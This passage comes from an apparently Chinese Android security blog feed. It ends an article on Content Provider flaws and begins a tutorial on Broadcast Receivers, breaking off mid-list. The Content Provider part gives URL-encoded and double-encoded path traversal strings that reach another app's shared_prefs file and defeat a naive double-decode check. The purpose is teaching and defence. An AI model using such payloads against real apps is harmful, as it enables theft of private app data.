class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span>;</span><br><span class="line"><span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">    File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,paramUri.getLastPathSegment());</span><br><span class="line">    <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以从目标代码中分析，这段代码使用android.net.Uri.getLastPathSegment()从paramUri中获取文件名，然后将其放置在预定义好的目录IMAGE_DIRECTORY中，如果该URL是encoded编码后的，那么将可能导致目录遍历漏洞</p><p>Android4.3开始，Uri.getLastPathSegment()内部实现调用Uri.getPathSegments()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Uri.getPathSegments()部分代码片段：  </span><br><span class="line">PathSegments <span class="title function_">getPathSegments</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(pathSegments!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> pathSegments;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> getEncoded();</span><br><span class="line">    <span class="keyword">if</span>(path==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">return</span> <span class="variable">pathSegments</span> <span class="operator">=</span> PathSegments.EMPTY;</span><br><span class="line">    &#125;</span><br><span class="line">    PathSegmentsBuilder segmentBuilder=<span class="keyword">new</span> <span class="title class_">PathSegmentsBuilder</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">previous</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> current;</span><br><span class="line">    <span class="keyword">while</span>((current=path.indexOf(<span class="string">&#x27;/&#x27;</span>,previous))&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(previous&lt;current)&#123;</span><br><span class="line">            String decodedSegment=decode(path.substring(previous,current));</span><br><span class="line">            segmentBuilder.add(decodedSegment);</span><br><span class="line">        &#125;</span><br><span class="line">        previous=current+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(previous&lt;path.length())&#123;</span><br><span class="line">        segmentBuilder.add(decode(path.substring(preyious)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pathSegments=segmentBuilder.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Uri.getPathSegments首先会通过getEncoded()获取一个路径，然后以”&#x2F;“为分隔符将path分成片段，最后调用decode()方法解码</p><p>假如我们传递encoded编码后的url给getLastPathSegment()，编码后的分隔符就变成了%2F,绕过了内部的分割规则，那么返回的就可能不是真正想要的文件了。这是API设计方面的问题，直接导致了目录遍历漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getLastPathSegment</span><span class="params">()</span>&#123;</span><br><span class="line">    List&lt;String&gt; segments=getPathSegments();</span><br><span class="line">    <span class="type">int</span> size=segments.size();</span><br><span class="line">    <span class="keyword">if</span>(size==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> segments.get(size-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了避免这种情况导致的目录遍历漏洞，开发者应该在传递给getLastPathSegment()之前解码，采用调用两次getLastPathSegment()方法的方式，第一次调用是为了解码，第二次调用期望得到正确的值这一部分大家可以详细参考博客：(<a href="https://tea9.xyz/post/758430476.html">https://tea9.xyz/post/758430476.html</a>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span> <span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">这个编码后的URL： ..%<span class="number">2F</span>..%<span class="number">2F</span>..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml   </span><br><span class="line">第一次调用getLastPathSegment()，会返回../../../data/data/com.example.android.app/shared_prefs/Example.xml。   </span><br><span class="line">第二次调用getLastPathSegment()会返回Example.xml  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然而攻击者可以采用一种叫做<span class="string">&quot;Double Encoding&quot;</span>的技术，使得第一次调用getLastPathSegment()后无法解码。 </span><br><span class="line"></span><br><span class="line">比如下面经过<span class="type">double</span> encoded后的string就可以绕过上面这种防御</span><br><span class="line"></span><br><span class="line">%252E%252E%<span class="number">252F</span>%252E%252E%<span class="number">252F</span>%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml </span><br><span class="line"></span><br><span class="line">第一次解码后： %2E%2E%<span class="number">2F</span>%2E%2E%<span class="number">2F</span>%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml</span><br><span class="line"></span><br><span class="line">第二次解码后： ../../../data/data/com.example.android.app/shared_prefs/Example.xml </span><br><span class="line">仍会导致目录遍历。所以简单的解码后再传人也是不够的，仍然需要严格校验以确保path是期望的路径。</span><br></pre></td></tr></table></figure><h4 id="（3）安全防护-2"><a href="#（3）安全防护-2" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 将不必要导出的Content Provider设置为不导出</span><br><span class="line"><span class="number">2.</span> 去除没有必要的openFile()接口</span><br><span class="line"><span class="number">3.</span> 过滤限制跨域访问，对访问的目标文件的路径进行有效判断</span><br><span class="line"><span class="number">4.</span> 设置权限来进行内部应用通过Content Provider的数据共享</span><br></pre></td></tr></table></figure><h2 id="四、实验总结"><a href="#四、实验总结" class="headerlink" title="四、实验总结"></a>四、实验总结</h2><p>本文对Content Provider内容提供器的基本原理做了一个详细讲解，然后对Provider常见的一些漏洞情况作了分析，这里面一部分漏洞来自于漏洞平台，一部分来自于网上的博客收集总结，还提供了一个样例sieve.apk，初步的实现信息泄露、SQL注入、目录遍历漏洞的基本操作方式，也介绍了一般挖掘provider漏洞的基本方法，其中关于drozer的具体操作使用，大家可以参考之前的博客：<a href="https://bbs.pediy.com/thread-269196.htm">Android漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF</a>，当然可能对于Provider中的漏洞介绍还不是很全面，其他的就请各位大佬指正了。</p><h2 id="五、参考文献"><a href="#五、参考文献" class="headerlink" title="五、参考文献"></a>五、参考文献</h2><p>Content Provider原理介绍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.cnblogs.com/tgyf/p/4696288.html</span></span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/5e13d1fec9c9</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/huansky/p/13785634.html</span></span><br><span class="line">http:<span class="comment">//www.tutorialspoint.com/android/android_content_providers.htm</span></span><br></pre></td></tr></table></figure><p>Content Provider漏洞挖掘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//tea9.xyz/post/758430476.html</span></span><br><span class="line">https:<span class="comment">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br><span class="line">https:<span class="comment">//wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0156386</span></span><br><span class="line">http:<span class="comment">//www.feidao.site/wordpress/?p=3295</span></span><br><span class="line">http:<span class="comment">//www.hackdig.com/03/hack-19497.htm</span></span><br><span class="line">https:<span class="comment">//mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;今天总结Android APP四大组件中Content Provider挖掘的知识，主要分为两个部分，一部分是对Android Content Provider内容提供器的原理总结，另一部分便是对Android provider机制常见的一些漏洞总结，包括一些已知的漏洞方法，和一部分案例实践。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（11）——Broadcast Recevier漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/13/bug0011/"/>
    <id>http://security-kitchen.com/2023/02/13/bug0011/</id>
    <published>2023-02-13T01:03:19.000Z</published>
    <updated>2023-12-23T09:13:44.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>今天继续总结Android APP漏洞四大组件中Broadcast Recevier漏洞挖掘的知识，主要分为两个部分，一部分对Android 广播机制原理作一个初步的总结，另一部分便是对Android 广播机制常见的一些漏洞进行总结，主要是介绍一些已存在的典型漏洞，部分知识可以参考前两篇帖子<a href="https://bbs.pediy.com/thread-269255.htm">Android APP漏洞之战（2）——Service漏洞挖掘详解</a>和<a href="https://bbs.pediy.com/thread-269211.htm">Android APP漏洞之战（1）——Activity漏洞挖掘详解</a>。</p><span id="more"></span><h2 id="二、Broadcast-Recevier初步介绍"><a href="#二、Broadcast-Recevier初步介绍" class="headerlink" title="二、Broadcast Recevier初步介绍"></a>二、Broadcast Recevier初步介绍</h2><h3 id="1-Broadcast-Recevier的基本原理"><a href="#1-Broadcast-Recevier的基本原理" class="headerlink" title="1.Broadcast Recevier的基本原理"></a>1.Broadcast Recevier的基本原理</h3><h3 id="（1）广播机制简介"><a href="#（1）广播机制简介" class="headerlink" title="（1）广播机制简介"></a>（1）广播机制简介</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android中的每个应用程序都可以对自己感兴趣的广播进行注册，这样该程序只会收到自己所关心的广播内容，这些广播可以是来自系统的，也可能是来自其他程序的。Android提供了一套完整的API,允许应用程序自由地发送和接收广播。</span><br><span class="line">   广播机制分为两个方面：广播发送者和广播接收者，一般来说，BroadcastReceiver就是广播接收者。     </span><br></pre></td></tr></table></figure><h3 id="（2）广播机制应用场景"><a href="#（2）广播机制应用场景" class="headerlink" title="（2）广播机制应用场景"></a>（2）广播机制应用场景</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Android内不同组件间的通信（应用/不同应用之间）</span><br><span class="line">（<span class="number">2</span>）多线程通信</span><br><span class="line">（<span class="number">3</span>）与Android系统在特定情况下的通信</span><br></pre></td></tr></table></figure><h3 id="（3）广播机制模型理解"><a href="#（3）广播机制模型理解" class="headerlink" title="（3）广播机制模型理解"></a>（3）广播机制模型理解</h3><p>Android的广播机制使用了设计模式中的观察者模式：基于消息的发布&#x2F;订阅事件模型，<code>从设计模式上讲，广播的发送者和接收者极大程度的**解耦**，使得系统方便集成，容易扩展</code>。</p><p>模型中的3个基本角色：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）消息订阅者（广播接收者）</span><br><span class="line">（<span class="number">2</span>）消息发布者（广播发布者）</span><br><span class="line">（<span class="number">3</span>）消息中心（AMS,即Activity Manager Service）</span><br></pre></td></tr></table></figure><p>模型的具体原理如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/1.png"></p><h3 id="（4）广播机制的使用流程"><a href="#（4）广播机制的使用流程" class="headerlink" title="（4）广播机制的使用流程"></a>（4）广播机制的使用流程</h3><p>我们先通过一个流程图来具体的理解广播机制的运行原理：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/2.png" alt="image-20210912150855995"></p><p>具体的操作流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）首先开发人员自定义广播接收者BroadcastReceiver，并重写onRecvice()方法，在里面可以实现具体操作，然后到消息中心AMS注册</span><br><span class="line">（<span class="number">2</span>）广播发送者定义并向AMS发送广播</span><br><span class="line">（<span class="number">3</span>）AMS查找符合相应条件（IntentFilter/Permission等）的BroadcastReceiver</span><br><span class="line">（<span class="number">4</span>）AMS将广播发送到上述符合条件的BroadcastReceiver相应的消息循环队列中</span><br><span class="line">（<span class="number">5</span>）BroadcastReceiver通过消息循环执行拿到此广播，回调BroadcastReceiver中的onReceive()方法。</span><br></pre></td></tr></table></figure><p>我们可以按照流程图具体一步步来实现广播机制：</p><p><strong>&lt;1&gt;自定义广播接收者BroadcastReceiver：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 继承BroadcastReceivre类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">mBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 复写onReceive()方法</span></span><br><span class="line">  <span class="comment">// 接收到广播后，则自动调用该方法</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">   <span class="comment">//写入接收广播后的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">操作步骤：</span><br><span class="line">（<span class="number">1</span>）继承BroadcastReceivre基类</span><br><span class="line">（<span class="number">2</span>）必须复写抽象方法onReceive()方法</span><br><span class="line">广播接收器接收到相应广播后，会自动回调 onReceive() 方法，一般情况下，onReceive方法会涉及 与 其他组件之间的交互，如发送Notification、启动Service等，默认情况下，广播接收器运行在 UI 线程，因此，onReceive()方法不能执行耗时操作，否则将导致ANR</span><br></pre></td></tr></table></figure><p><strong>&lt;2&gt;广播接收者注册：</strong></p><p>注册的方式分为两种：静态注册、动态注册</p><p><strong>静态注册：</strong></p><p>注册方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在AndroidManifest.xml里通过&lt;receive&gt;标签声明</span><br></pre></td></tr></table></figure><p>属性说明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">[</span>&quot;<span class="attr">true</span>&quot; | &quot;<span class="attr">false</span>&quot;]</span></span><br><span class="line"><span class="tag">//<span class="attr">此broadcastReceiver能否接收其他App的发出的广播</span></span></span><br><span class="line"><span class="tag">//<span class="attr">默认值是由receiver中有无intent-filter决定的</span>：<span class="attr">如果有intent-filter</span>，<span class="attr">默认值为true</span>，<span class="attr">否则为false</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">[</span>&quot;<span class="attr">true</span>&quot; | &quot;<span class="attr">false</span>&quot;]</span></span><br><span class="line"><span class="tag">    <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">//<span class="attr">继承BroadcastReceiver子类的类名</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">//<span class="attr">具有相应权限的广播发送者发送的广播才能被此BroadcastReceiver所接收</span>；</span></span><br><span class="line"><span class="tag">    <span class="attr">android:permission</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">//<span class="attr">BroadcastReceiver运行所处的进程</span></span></span><br><span class="line"><span class="tag">//<span class="attr">默认为app的进程</span>，<span class="attr">可以指定独立的进程</span></span></span><br><span class="line"><span class="tag">//<span class="attr">注</span>：<span class="attr">Android四大基本组件都可以通过此属性指定自己的独立进程</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:process</span>=<span class="string">&quot;string&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">//用于指定此广播接收器将接收的广播类型</span><br><span class="line">//本示例中给出的是用于接收网络状态改变时发出的广播</span><br><span class="line"> <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>具体实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> </span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们完成静态注册后，当App首次启动时，系统会自动实例化mBroadcastReceiver类，并注册到系统中</p><p><strong>动态注册：</strong></p><p>注册方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态注册需要在功能代码中进行注册</span><br></pre></td></tr></table></figure><p>具体实例：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/4.png" alt="image-20210912150855995"></p><p>具体实现步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）实例化自定义的广播接收者，我们实现广播的功能，可以继承BroadcastReceiver类，并重写类中的方法</span><br><span class="line">（<span class="number">2</span>）实例化意图过滤器，并设置要过滤的广播类型</span><br><span class="line">（<span class="number">3</span>）使用Context的registerReceiver(BroadcastReceiver,IntentFilter)方法注册广播</span><br><span class="line">（<span class="number">4</span>）在onDestory()方法中通过调用unregisterReceiver()方法来实现取消注册</span><br></pre></td></tr></table></figure><p>注意事项：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注意：动态广播最好在Activity的onResume()注册、onPause()注销</span><br><span class="line">原因：</span><br><span class="line"><span class="number">1.</span>对于动态广播，有注册就必然得有注销，否则会导致内存泄露</span><br><span class="line"><span class="number">2.</span>Activity生命周期如下都是成对出现的 onCreate() &amp; onDestory()、onStart() &amp; onStop()、onResume() &amp; onPause()</span><br><span class="line"></span><br><span class="line">在onResume()注册、onPause()注销是因为onPause()在App死亡前一定会被执行，从而保证广播在App死亡前一定会被注销，从而防止内存泄露。</span><br><span class="line">（<span class="number">1</span>）不在onCreate() &amp; onDestory() 或 onStart() &amp; onStop()注册、注销是因为：当系统因为内存不足（优先级更高的应用需要内存，请看上图红框）要回收Activity占用的资源时，Activity在执行完onPause()方法后就会被销毁，有些生命周期方法onStop()，onDestory()就不会执行。当再回到此Activity时，是从onCreate方法开始执行。</span><br><span class="line">（<span class="number">2</span>）假设我们将广播的注销放在onStop()，onDestory()方法里的话，有可能在Activity被销毁后还未执行onStop()，onDestory()方法，即广播仍还未注销，从而导致内存泄露。</span><br><span class="line">（<span class="number">3</span>）但是，onPause()一定会被执行，从而保证了广播在App死亡前一定会被注销，从而防止内存泄露。</span><br></pre></td></tr></table></figure><p><strong>两种注册方式的对比：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/5.png" alt="image-20210912150855995"></p><p>这里我们就完成了广播接收者的基本工作</p><p><strong>&lt;3&gt;广播发送者定义和发送广播：</strong></p><p><strong>广播的发送：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）广播 是 用意图（Intent）标识</span><br><span class="line">（<span class="number">2</span>）定义广播的本质 = 定义广播所具备的“意图（Intent）</span><br><span class="line">（<span class="number">3</span>）广播发送 = 广播发送者 将此广播的“意图（Intent）”通过sendBroadcast（）方法发送出去</span><br></pre></td></tr></table></figure><p><strong>广播的类型：</strong></p><p>第一种分类：</p><p>广播接收器一般可以分为两种类型：标准广播和有序广播</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">标准广播：一种完全异步执行的广播，广播发出之后，所有的广播接收器都会在同一时刻接收这条广播信息，广播效率比较高，同时是无法截断的。</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/6.png" alt="image-20210912150855995"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有序广播：是一种同步执行的广播，在广播发出之后，同一时刻会有一个广播接收器能收到这条广播消息，当这个广播接收器中逻辑执行完毕后，广播才会继续传递。</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/7.png" alt="image-20210912150855995"></p><p>第二种分类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">广播的类型主要分为<span class="number">5</span>类：</span><br><span class="line">（<span class="number">1</span>）普通广播</span><br><span class="line">（<span class="number">2</span>）系统广播</span><br><span class="line">（<span class="number">3</span>）有序广播</span><br><span class="line">（<span class="number">4</span>）粘性广播</span><br><span class="line">（<span class="number">5</span>）App应用内广播</span><br></pre></td></tr></table></figure><p><strong>普通广播：</strong></p><p>开发者自身定义intent的广播（最常用），发送广播使用如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="comment">//对应BroadcastReceiver中intentFilter的action</span></span><br><span class="line">intent.setAction(<span class="string">&quot;BROADCAST_ACTION&quot;</span>);</span><br><span class="line"><span class="comment">//发送广播</span></span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>若被注册了的广播接收者中注册时intentFilter的action与上述匹配，则会接收此广播（即进行回调onReceive()）,如下mBroadcastReceiver则会接收上述广播</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> </span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;BROADCAST_ACTION&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果发送的广播有对应权限，那么广播接收者也需要对应权限</p><p><strong>系统广播：</strong></p><p>Android中内置了多个系统广播：只要涉及到手机的基本操作（如开机、网络状态变化、拍照等），都会发送相应的广播每个广播都有特定的Intent-Filter(包括具体的action)，Android系统广播action如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">系统操作action</span><br><span class="line">监听网络变化android.net.conn.CONNECTIVITY_CHANGE</span><br><span class="line">关闭或打开飞行模式Intent.ACTION_AIRPLANE_MODE_CHANGED</span><br><span class="line">充电时或电量发生变化Intent.ACTION_BATTERY_CHANGED</span><br><span class="line">电池电量低Intent.ACTION_BATTERY_LOW</span><br><span class="line">电池电量充足（即从电量低变化到饱满时会发出广播Intent.ACTION_BATTERY_OKAY</span><br><span 